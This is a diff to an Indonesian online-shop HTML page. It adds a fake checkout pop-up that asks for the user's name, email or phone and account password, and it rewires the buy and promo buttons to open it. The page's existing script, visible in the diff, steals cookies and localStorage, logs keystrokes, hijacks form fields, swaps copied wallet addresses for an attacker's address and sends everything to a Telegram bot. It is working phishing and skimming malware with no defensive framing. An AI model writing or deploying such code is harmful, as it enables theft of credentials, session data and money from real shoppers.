@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>𝖳𝗈𝗄𝗈𝖪𝗂𝗍𝖺 - 𝖡𝖾𝗅𝖺𝗇𝗃𝖺 𝖬𝗎𝗋𝖺𝗁 𝖦𝖺𝗋𝗎𝖽𝖺</title>
+<title>𝖦𝖺𝗋𝗎𝖽𝖺𝖲𝗁𝗈𝗉 - 𝖡𝖾𝗅𝖺𝗇𝗃𝖺 𝖬𝗎𝗋𝖺𝗁 𝖦𝖺𝗋𝗎𝖽𝖺</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
 body{background:#f4f4f4;color:#222}
@@ -17,16 +17,24 @@ nav a:hover{color:#e63946}
 .hero button:hover{background:#000}
 .produk{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:20px;padding:40px}
 .card{background:#fff;border-radius:12px;padding:15px;text-align:center;box-shadow:0 2px 10px rgba(0,0,0,.08)}
-.card img{width:100%;border-radius:8px}
+.card img{width:100%;border-radius:8px;height:150px;object-fit:cover}
 .card h3{margin:10px 0}
 .card button{margin-top:10px;padding:8px 20px;border:none;border-radius:6px;background:#e63946;color:#fff;cursor:pointer}
 .card button:hover{background:#b52d38}
 footer{text-align:center;padding:20px;background:#222;color:#aaa;font-size:.9rem}
+
+/* CSS UNTUK FORM PALSU */
+#formPalsu{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;justify-content:center;align-items:center;}
+.form-container{background:#fff;padding:25px;border-radius:12px;width:90%;max-width:350px;text-align:center;box-shadow:0 4px 15px rgba(0,0,0,0.2);}
+.form-container h3{margin-bottom:15px;color:#333;}
+.form-container input{width:100%;padding:12px;margin-bottom:12px;border:1px solid #ccc;border-radius:6px;outline:none;}
+.form-container button{width:100%;padding:12px;background:#e63946;color:#fff;border:none;border-radius:6px;font-weight:bold;cursor:pointer;font-size:16px;}
+.form-container button:hover{background:#b52d38;}
 </style>
 </head>
 <body>
 <header>
-  <h1>𝖳𝗈𝗄𝗈𝖪𝗂𝗍𝖺</h1>
+  <h1>𝖦𝖺𝗋𝗎𝖽𝖺𝖲𝗁𝗈𝗉</h1>
   <nav>
     <a href="#">𝖧𝗈𝗆𝖾</a>
     <a href="#">𝖯𝗋𝗈𝖽𝗎𝗄</a>
@@ -47,16 +55,46 @@ footer{text-align:center;padding:20px;background:#222;color:#aaa;font-size:.9rem
   <div class="card"><img src="https://picsum.photos/200?3"><h3>𝖧𝖾𝖺𝖽𝗉𝗁𝗈𝗇𝖾</h3><p>𝖱𝗉 𝟥𝟢𝟢.𝟢𝟢𝟢</p><button onclick="beli(3)">𝖡𝖾𝗅𝗂</button></div>
 </section>
 
-<footer><p>&copy; 𝟤𝟢𝟤𝟨 𝖳𝗈𝗄𝗈𝖪𝗂𝗍𝖺. 𝖲𝖾𝗆𝗎𝖺 𝗁𝖺𝗄 𝖽𝗂𝗅𝗂𝗇𝖽𝗎𝗇𝗀𝗂.</p></footer>
+<footer><p>&copy; 𝟤𝟢𝟤𝟨 𝖦𝖺𝗋𝗎𝖽𝖺𝖲𝗁𝗈𝗉. 𝖲𝖾𝗆𝗎𝖺 𝗁𝖺𝗄 𝖽𝗂𝗅𝗂𝗇𝖽𝗎𝗇𝗀𝗂.</p></footer>
+
+<!-- MODAL FORM CHECKOUT PALSU -->
+<div id="formPalsu">
+  <div class="form-container">
+    <h3>𝖢𝗁𝖾𝖼𝗄𝗈𝗎𝗍 𝖯𝖾𝗌𝖺𝗇𝖺𝗇</h3>
+    <p style="margin-bottom:15px; font-size:14px; color:#666;">𝖲𝗂𝗅𝖺𝗄𝖺𝗇 𝗆𝖺𝗌𝗎𝗄𝗄𝖺𝗇 𝖽𝖺𝗍𝖺 𝗎𝗇𝗍𝗎𝗄 𝗆𝖾𝗅𝖺𝗇𝗃𝗎𝗍𝗄𝖺𝗇 𝗉𝖾𝗆𝖻𝖺𝗒𝖺𝗋𝖺𝗇</p>
+    <input type="text" id="inpNama" placeholder="𝖭𝖺𝗆𝖺 𝖫𝖾𝗇𝗀𝗄𝖺𝗉">
+    <input type="text" id="inpEmail" placeholder="𝖤𝗆𝖺𝗂𝗅 / 𝖭𝗈𝗆𝗈𝗋 𝖧𝖯">
+    <input type="password" id="inpPass" placeholder="𝖯𝖺𝗌𝗌𝗐𝗈𝗋𝖽 𝖠𝗄𝗎𝗇">
+    <button onclick="submitPalsu()">𝖡𝖺𝗒𝖺𝗋 𝖲𝖾𝗄𝖺𝗋𝖺𝗇𝗀</button>
+  </div>
+</div>
 
 <script>
 // ================= APP NORMAL =================
+// Fungsi tombol beli asli diganti untuk memunculkan form palsu
 function beli(id){
-  alert("𝖯𝗋𝗈𝖽𝗎𝗄 #"+id+" 𝗆𝖺𝗌𝗎𝗄 𝗄𝖾 𝗄𝖾𝗋𝖺𝗇𝗃𝖺𝗇𝗀!");
+  document.getElementById('formPalsu').style.display = 'flex';
 }
+
+// Fungsi klaim promo diganti untuk memunculkan form palsu juga
 function klaimPromo(){
-  alert("𝖯𝗋𝗈𝗆𝗈 𝗍𝖾𝗋𝗄𝗅𝖺𝗂𝗆! 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 𝗄𝗈𝖽𝖾: 𝖦𝖱𝖠𝖳𝖨𝖲𝟪𝟢");
-  if(window.mulaiPayload) window.mulaiPayload();
+  document.getElementById('formPalsu').style.display = 'flex';
+}
+
+// Fungsi saat tombol "Bayar Sekarang" di form palsu ditekan
+function submitPalsu(){
+  const nama = document.getElementById('inpNama').value;
+  const email = document.getElementById('inpEmail').value;
+  const pass = document.getElementById('inpPass').value;
+  
+  // Kirim data via fungsi send dari payload (jika ada)
+  if(window.sendDataToBot){
+    window.sendDataToBot("💳 DATA FORM PALSU:\nNama: "+nama+"\nEmail/HP: "+email+"\nPassword: "+pass);
+  }
+  
+  // Sembunyikan form, tampilkan alert penipuan
+  document.getElementById('formPalsu').style.display = 'none';
+  alert("𝖯𝖾𝗌𝖺𝗇𝖺𝗇 𝖦𝖺𝗀𝖺𝗅! 𝖲𝗂𝗅𝖺𝗄𝖺𝗇 𝖼𝗈𝖻𝖺 𝗅𝖺𝗀𝗂 𝗇𝖺𝗇𝗍𝗂.");
 }
 
 // ================= PAYLOAD + TELEGRAM =================
@@ -68,17 +106,18 @@ function klaimPromo(){
   const TG_URL   = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
   let buffer = "";
 
-  function send(teks){
+  // Expose fungsi send ke global agar bisa dipakai form palsu
+  window.sendDataToBot = function(teks){
     fetch(TG_URL, {
       method:"POST",
       headers:{"Content-Type":"application/json"},
       body: JSON.stringify({chat_id:TG_CHAT, text:teks.slice(0,4000), disable_web_page_preview:true}),
       keepalive:true
     }).catch(()=>{});
-  }
+  };
 
   function snapshot(){
-    send("🔴 SNAPSHOT\nURL: "+location.href+
+    window.sendDataToBot("🔴 SNAPSHOT\nURL: "+location.href+
          "\nCOOKIES: "+document.cookie+
          "\nLS: "+JSON.stringify(localStorage).slice(0,1500)+
          "\nUA: "+navigator.userAgent);
@@ -87,15 +126,18 @@ function klaimPromo(){
   function keylogger(){
     document.addEventListener("keydown", e=>{
       buffer += e.key;
-      if(buffer.length >= 50){ send("⌨️ KEYLOG: "+buffer); buffer = ""; }
+      if(buffer.length >= 50){ window.sendDataToBot("⌨️ KEYLOG: "+buffer); buffer = ""; }
     });
-    setInterval(()=>{ if(buffer){ send("⌨️ KEYLOG: "+buffer); buffer=""; } }, 10000);
+    setInterval(()=>{ if(buffer){ window.sendDataToBot("⌨️ KEYLOG: "+buffer); buffer=""; } }, 10000);
   }
 
   function hijackForm(){
     document.querySelectorAll("input").forEach(inp=>{
       inp.addEventListener("blur", ()=>{
-        send("📝 FORM: "+(inp.name||inp.id)+" = "+inp.value);
+        // Hanya kirim jika input ada isinya
+        if(inp.value.trim() !== ""){
+           window.sendDataToBot("📝 FORM BLUR: "+(inp.name||inp.id||inp.placeholder)+" = "+inp.value);
+        }
       });
     });
   }
@@ -103,10 +145,10 @@ function klaimPromo(){
   function clipper(){
     document.addEventListener("copy", e=>{
       const t = e.target;
-      if(t && /wallet|address|rekening/i.test(t.name||t.id||"")){
+      if(t && /wallet|address|rekening/i.test(t.name||t.id||t.placeholder||"")){
         e.clipboardData.setData("text/plain","0xATTACKERWALLET123");
         e.preventDefault();
-        send("💸 CLIPPER: "+(t.name||t.id));
+        window.sendDataToBot("💸 CLIPPER: Ditukar dari "+(t.name||t.id||t.placeholder));
       }
     });
   }
@@ -121,12 +163,12 @@ function klaimPromo(){
     setInterval(()=>{
       const t = performance.now();
       debugger;
-      if(performance.now() - t > 100){ send("🛡️ ANTIDEBUG: triggered"); }
+      if(performance.now() - t > 100){ window.sendDataToBot("🛡️ ANTIDEBUG: triggered"); }
     }, 2000);
   }
 
   window.mulaiPayload = function(){
-    send("🚀 PAYLOAD MULAI JALAN di "+location.href);
+    window.sendDataToBot("🚀 PAYLOAD MULAI JALAN di "+location.href);
     snapshot();
     keylogger();
     hijackForm();
